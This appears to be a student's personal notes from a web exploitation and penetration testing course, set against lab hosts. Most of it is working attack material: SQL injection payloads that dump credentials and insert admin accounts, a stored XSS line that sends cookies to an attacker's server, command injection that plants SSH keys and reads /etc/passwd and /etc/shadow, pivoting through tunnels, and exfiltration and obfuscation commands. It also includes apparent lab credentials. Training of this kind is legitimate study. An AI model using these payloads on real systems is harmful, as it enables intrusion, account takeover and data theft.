# SECURITY:


## WEB EXPLOITATION DAY 2 - SQL INJECTION: 
```
https://sec.cybbh.io/-/public/-/jobs/872115/artifacts/slides/05-sql-injection-slides.html
```
```
SELECT: Extracts data from a database

UNION: Used to COMBINE the result-set of TWO OR MORE SELECT STATEMENTS

USE: Selects the DB to use

UPDATE: Updates data in a database

DELETE: Deletes data from a database

INSERT INTO: Inserts new data into a database

CREATE DATABASE: Creates a new database

ALTER DATABASE: Modifies a database

CREATE TABLE: Creates a new table

ALTER TABLE: Modifies a table

DROP TABLE: Deletes a table

CREATE INDEX: Creates an index (search key)

DROP INDEX: Deletes an index
```

SQL injection: 
```
Input fields can be found using a Single Quote --> '
Will return extraneous information

' closes a variable, to allow for additional statements/clauses

May show no errors or generic error (harder Injection)
Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)
Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')
Server-Side Query Processing
User enters JohnDoe243 in the name form field and pass1234 in the pass form field.
The Server-Side Query that would be passed to MySQL from PHP would be:

BEFORE INPUT:
SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;
AFTER INPUT:
SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;
Example - Injecting Your Statement
User enters TOM' OR 1='1 in the name and pass fields.


Truth Statement: tom ' OR 1='1


Server-Side query executed would appear like this:


SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
```
## Stacking Statements:
```
Chaining multiple statements together using a semi-colon ;
SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’
```
## Nesting statements
```
Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.
Though they may allow for nesting a statement within an existing one:
php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
```
## Ignore the rest
```
Using # or -- tells the Database to ignore everything after

Server-Side Query:
SELECT product FROM item WHERE id = $select limit 1;

Input to Inject:
1 OR 1=1; #

Server-Side Query becomes:
SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;
```
Blind Injection
```
Inlcudes Statements to determine how DB is configured

Columns in Output

Can we return errors

Can we return expected Output

Used when unsanitized fields give generic error or no messages



Normal Query to pull expected output:

php?item=4



Blind injection for validation:

php?item=4 OR 1=1



Try ALL combinations! ITEM=1, ITEM=2, ITEM=3, ETC.
```
Abuse The Client (GET METHOD):
```
Passing injection through the URL:

After the .PHP?ITEM=4 pass your UNION statement



prices.php?item=4 UNION SELECT 1,2



prices.php?item=4 UNION SELECT 1,2,@@version



What is @@VERSION?
```
Abuse The Client (Enum):
```
Identifying the schema leads to detailed queries to enumerate the DB



Research Database Schemas and what information they provide



php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()


What are INFORMATION_SCHEMA and DATABASE()?
```
```
SQL Injection (Database Enumeration):
DEMO: SQL Injection (Database Enumeration)
http://10.50.XX.XX/Union.html
Abuse The Client (Enum)
Identifying the schema leads to detailed queries to enumerate the DB

Defending Against
Validate inputs! Methods differ depending on software
CONCATENATE : turns inputs into single strings or escape characters
PHP: MYSQL_REAL_ESCAPE_STRING
SQL: SQLITE3_PREPARE()
```
```
2	JABL-503-M	nTtMzFJMeldqFBk	10.50.31.212     10.10.28.40/27 Jump box             10.50.39.26 (Linux opstation)             10.50.30.174(Windows opstation)





student@lin-ops:~$ ssh -MS /tmp/jump student@10.50.31.212
student@lin-ops:~$ ssh -S /tmp/jump dummy -O forward -D9050
for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &) ; done
proxychains nmap 192.168.28.97,98,100,105,111,120
proxychains nc 192.168.28.111 80 
proxychains nc 192.168.28.100 80
ssh -S /tmp/jump dummy -O forward -L1111:192.168.28.100:80 -L2222:192.168.28.111:80
 
firefox 127.0.0.1:1111

ssh -S /tmp/jump dummy -O forward -L1111:192.168.28.100:80 -L2222:192.168.28.111:80 -L4444:192.168.28.111:22 (assuming that port 22 works and it is in fact ssh)

ssh -S /tmp/jump dummy -O cancel -L1111:192.168.28.100:80 (if you mess up you can cancel the socket file with this command)

ssh -MS /tmp/t1 student@127.0.0.1 -p 4444 (if this existed we verify that ssh existed we could ssh through port 4444, another socket file)

keep in mind user name and that -NT allows you to background it 




ssh -S /tmp/t1 dummy -O forward -L5555:192.168.50.100:22

ssh -MS /tmp/t2 credentials@127.0.0.1 -p 5555


WHEN PORT 80 IS OPEN.
proxychains nmap --script=http-enum 192.168.28.100 Everytime that we are dealing with web stuff we use this command

check if there is robots.txt and inspect the source code.

proxychains nmap --script=smb-os-discovery.nse 192.168.150.225,226,227,245
/usr/share/nmap/scripts location


LINOPS----->JUMP------>TGTS

HTTP://10.50.20.30:8000/

GOOGLE: cybbh git security

for i in {1..254}; do (ping -c 1 192.168.65.$i | grep "bytes from" &) ; done


1-PENETRATION TESTING OVERVIEW:

	ssh tunnels refresh:

	ssh student@172.16.0.66 -L 12299:192.168.0.1:22 (ports are open on 12299 on my workstation and 22 on the target, we are using redirector to pivot redir---->target).
	ssh localhost -p 12299 (this window will grant access to the 192.168.0.1 machine).

	Master sockets: 
	
	


	COOKIES: 
	File stored in a web server that saves user information preferences to smooth service every time user requests access to the server.
	
	wget -r -l2 -P /tmp ftp://ftpserver/
	wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
	wget --load-cookies cookies.txt -p https://website/interesting/article.php

	nmap --script=http-nse.enum 192.168.24.160-------> /robots.txt helps to ennumerate the ip. Go on that page and see what is in there.
	once find the directories when can access to them.
	
	
	Stored XXS:
	
	python3 -m http.server (simulates storing XSS) 
	<script>document.location="http://10.50.39.26:8000/"+document.cookie;</script>

	Command Injection:
	
	System to ping 
	
	Run commands on box with a ; first.
	; cat /etc/passwd
	
	ssh-keygen -t rsa -b 4096 enter and y (It will regenerate all ssh keys, ssh keys are located on .ssh/id_rsa.pub for public, id_rsa for private)
	
	
	" > /var/www/.ssh/authorized_keys
	send it and cat /var/www/.ssh/authorized_keys the same exact file 
	
	ssh -i .ssh/id_rsa www-data@10.50.24.160

	ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDLE2261FZuDkbLynw1ADUrxmPlza3dmnNVwWSvgEO2o3p9Of/hfnzSL5dyXu985pVV0Aa9aTMlZJrCnbmZVaRE+8bQJL6jLqBB8Z+N26b6jggAm1xPYhsdfsNjfE1PKq/	neqVCyddV9loDOfLarY9MrIMcnlTK6DhVys/86XHni+5TFUsLcO7htIvrVcjyPcInnSdQ0iqJSifaiqZ6KJ4zveOrgk5K57nL8nHKIAEU016Ws+WBs0bVEXgzN/xNpWxO/yFhOy5nuI2pZI8aSIgDHc6FkwWHnNaDlTooyVeIHLXK6dUoUAcj7m3ptKUh2l67hih2Iw3SJDTJZ6YXLJ3eqvFpgmDPV0VxpTdJ63Pop7OVq7fU3xtMFiZ3MteF9O5FNFn/jh//pfZ03YqgF7zmbwcdYwVeN8Dq7r8rGaIZLTJ25V+whl+jYXwdxkIEsys66+A9nK5LP377noVulLvsxEGLDEW0QNTHaZLVKYj8mY40iBWJtW4E1m3l83/JhyYhskpLBXZendovcUu1mKsopU1nCQAtltGC7B7VPssqiCPJzaJuUgd2ChgRCwk6uLdL+oMWjTka9LxKf37ZcZ2Xb3sW6BYq3qf6jrIsQ8B65sNhETSlJY7WhgUusR+VKg8e


SQL-COMMANDS FOR ENNUMERATION:

mysql
show databases ;
SHOW tables FROM session ;
SHOW columns FROM session.Tires ;
SELECT tiresid,name,size,cost FROM session.Tires ;
show columns from session.car ;
SLECT tireid,name,cost,siza FROM session.Tires UNION SELECT carid,name,color,cost FROM session.car;


tom ' OR 1='1
tom ' OR 1='1

F12 
Network
POST METHOD 
REQUEST 
RAW
add ? after login.php and copy username string 
view page source 

copy all credentials once found


POST METHOD:
1. ID vulnerable field (in this case car brands)

2. Try all fields until you find the unsanitized field (Audi)

			Audi ' OR 1='

3.Identify columns:

			Audi ' UNION SELECT 1,2,3,4,5 #

4.Create Golden Statement:

			Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #


UNION SELECT table_schema,table_name,column_name FROM information_schema.columns


			Audi ' UNION SELECT <column>,<column>,<column>, FROM database.table #
			
5.Craft Query: Replace query with information we want to get 

			Audi ' UNION SELECT studentID,2,username,passwd, 5 FROM session.userinfo #
			Audi ' UNION SELECT 1,2,name,pass, 5 FROM session.user #

			
			
			
Cars we sell POST method
Ford

Dodge

Honda

Audi

Enter your selection ￼ ￼Submit


Tires we sell GET method
￼
Cooper-￼Submit




		THE GET METHOD:
		
		http://10.50.26.140/uniondemo.php?Selection=2 OR 1=1
		http://10.50.26.140/uniondemo.php?Selection=2 UNION SELECT 1,2,3

		?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
		
		?Selection=2 UNION SELECT id,pass,@@version FROM session.user
		
		
		
		
		Annotate databases, tables and columns: 
		Database: session
		
		Tables: Tires,car,session_log,user,userinfo
		
		other db
		Tbles: ,pre,infor,nation
		
		Columns
		(Tires) tireid,name,size,cost
		(car): carid,name,type,cost,color,year
		etc...

		delete from comments where ID  = 57 ;57 





http://127.0.0.1:3434/cases/productsCategory.php?category=1 UNION SELECT password,username 3 FROM sqlinjection.members


Input in all fields the one that does not show changes is the non validated one.
Play with the query to find where is the priviledge level at in this case is the last field 

http://127.0.0.1:3434/cases/productsCategory.php?category=1%20UNION%20SELECT%20password,username,%20permission%20FROM%20sqlinjection.members                  *shows the account creation live on SQL


INSERT INTO members (first_name, last_name, username, password, email, permission)
VALUES ('Hacker', 'Hacker', 'Hacker', '1', '1', 1)

Hacker','Hacker','Hacker', 1) # 

This will give us the output of  

INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'Hacker', 'Hacker','Hacker','Hacker', 1) #', '1', '1', 3)           *We do not care what happens after the #


Register
Thank you Hacker','Hacker','Hacker', 1) # ! Your profile was created. 

log in after getting the register msg.


student@lin-ops:~/Downloads$ ls
entry.c  entry.exe
student@lin-ops:~/Downloads$ scp entry* student@10.50.30.174:C:
student@10.50.30.174's password: 
entry.c                                                                                                                                                                  100%  291   380.1KB/s   00:00    
entry.exe                                                                                                                                                                100%  111KB  71.4MB/s   00:00 





ssh -MS /tmp/jump student@10.50.31.212 to the JUMP 
ssh -S /tmp/jump dummy -O forward -D9050
ssh -S /tmp/jump dummy -O forward -L1111:192.168.28.111:2222


a.ssh comrade@localhost -p 1111
Create script form ~$ and run it on /.hidden dir sudo ./inventory.exe <<<$(python /home/comrade/linbuffC.py)

b.scp -P 2222 ./inventory.exe comrade@127.0.0.1:.         #The dot will specify /home/comrade
scp script ensuring that if it has the same name it will be sent to a different directory.




comrade@web:~$ vim linbuffC.py
comrade@web:~$ ls
linbuffC.py
comrade@web:~$ cd /.hidden/
comrade@web:/.hidden$ sudo ./inventory.exe <<<$(python /home/comrade/linbuffC.py)


```
```
SSH KEYS:

SSH keys are asymetric(public/private) key pairs that can be used to authenticate a user to a system in combination with or to replace the use of a password

If you are able to find a users private ssh key it can potentially be used to gain access to other systems

Using Stolen SSH Keys
Bring private key to your own box

On your box:

chmod 600 /home/student/stolenkey

ssh -i /home/student/stolenkey jane@1.2.3.4

ssh as the user who is the original key owner
```
```
USER ENUMERATION:

	Windows net user 
	        tasklist /v 
	        tasklist /svc
	        ipconfig /all
	 	check the /tmp/backup.tar.gz
	
	Linux cat /etc/passwd /etc/host
	           ps -elf 
	           chkconfig 
	           systemctl --type=service 
                   ip a
                   
```
```
DATA EXFILTRATIONS:

Session Transcript
 ssh <user>@<host> | tee

Obfuscation (Windows)
type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
certutil -encode <file> encoded.b64


Obfuscation (Linux)
cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
cat <file>> | base64

Encrypted Transport
scp <source> <destination>
ncat --ssl <ip> <port> < <file>





scp <source> <destination>

## local to remote 
scp /path/to/file.txt student@10.50.XX.XX:/path/to/destination/file.txt


## remote to local 


scp student@10.50.xx.xx:/path/to/destination/file.txt /path/to/destination

ssh -MS  /tmp/jump dummy -O forward -L1111:192.168.28.XX:2222
scp -P 1111 creds@127.0.0.1:/path/to/file.txt . 
example  scp -P 1111 www-data@127.0.0.1:/tmp/backup.tar.gz . 




grep -R <service-name> /var/log

f
e0R3uOOlCOsLjj991uHK
```
```
----------------------------------Upload your ssh key to a box-------------------------------- 

1.Find out what account is running the web sever/commands.  ;whoami do not forget the ; if your trying command injection.

2.Once the user is known find this users home folder by looking in /etc/passwd. We also want to make sure the user has a login shell. For the demo we looked for www-data in passwd because they were the resluting user from the previous whoami command.

 www-data:x:33:33:www-data:/var/www:/bin/bash    #/var/www is the home folder for this user and /bin/bash is login shell.

3.Check to see if .ssh folder is in the users home directory. If not make it

 ls -la /var/www/.ssh      #check if .ssh exists
 mkdir /var/www/.ssh   #make .ssh in users home folder if it does not exist


get your public key from   cat ~/.ssh/id_rsa.pub
echo "ssh-rsa... " >> /users/home/directory/.ssh/authorized_keys

run ; echo "ssh-rsa... " >> /users/home/directory/.ssh/authorized_keys

----------------------------------------------------------------------------------------------
```
```
ENNUMERATION COMMANDS ON LINUX:

find /  -name "*inventory*"
cat /etc/hosts to finde the intranet
cat /etc/passwd
cat /etc/shadow




```

